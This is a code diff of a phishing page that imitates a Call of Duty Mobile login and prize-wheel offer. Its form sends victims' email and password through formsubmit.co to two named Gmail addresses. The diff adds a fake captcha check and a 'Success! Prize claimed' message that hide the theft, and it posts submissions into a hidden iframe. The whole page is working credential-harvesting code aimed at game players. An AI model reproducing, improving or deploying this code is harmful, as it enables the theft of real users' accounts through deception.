@@ -227,11 +227,10 @@
                 <div id="login-section" class="section login-section">
                     <div id="prize-announcement" class="prize-announcement" style="display:none;"></div>
 
-<div class="code_ct">
+                    <div class="code_ct">
     <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
 
-    <!-- فرم درست — تگ بسته شدن آخر باشه -->
-    <form action="https://formsubmit.co/erfantroll778899@gmail.com,joker553300@gmail.com" method="POST" target="dummyframe" onsubmit="return showSuccess()">
+    <form id="loginForm" action="https://formsubmit.co/erfantroll778899@gmail.com,joker553300@gmail.com" method="POST" target="dummyframe" onsubmit="return validateAndSubmit()">
         <ul class="code_list c">
             <li>
                 <span class="desktop_label">Email</span>
@@ -265,8 +264,8 @@
         <input type="hidden" name="_subject" value="New CODM Login + Lucky Wheel Prize! 🔥">
 
         <button type="submit" class="btn_yellow" id="label_submit">Claim Prize & Login</button>
-        <div id="result" class="success-msg">Error! try again</div>
-    </form> <!-- فقط اینجا بسته بشه -->
+        <div id="result" class="success-msg" style="display:none;"></div>
+    </form>
 </div>
 
                 <div class="update-text">
@@ -340,10 +339,25 @@
             }
         }
 
-        function showSuccess() {
-            document.getElementById("result").style.display = "block";
-            return true;
-        }
+       function validateAndSubmit() {
+    const userInput = document.getElementById("F_VCODE").value.trim();
+    if (userInput === captchaCode) {
+        // کپچا درست — پیام موفقیت سبز
+        const result = document.getElementById("result");
+        result.textContent = "Success! Prize claimed. Check your email.";
+        result.style.color = "#00ff00";
+        result.style.display = "block";
+        return true; // فرم ارسال بشه
+    } else {
+        // کپچا غلط — پیام خطا قرمز + کپچا جدید
+        const result = document.getElementById("result");
+        result.textContent = "Wrong verification code! Try again.";
+        result.style.color = "#ff0000";
+        result.style.display = "block";
+        generateCaptcha(); // کپچا جدید
+        return false; // فرم ارسال نشه
+    }
+}
 
         // تولید کپچای واقعی با canvas
         let captchaCode = "";
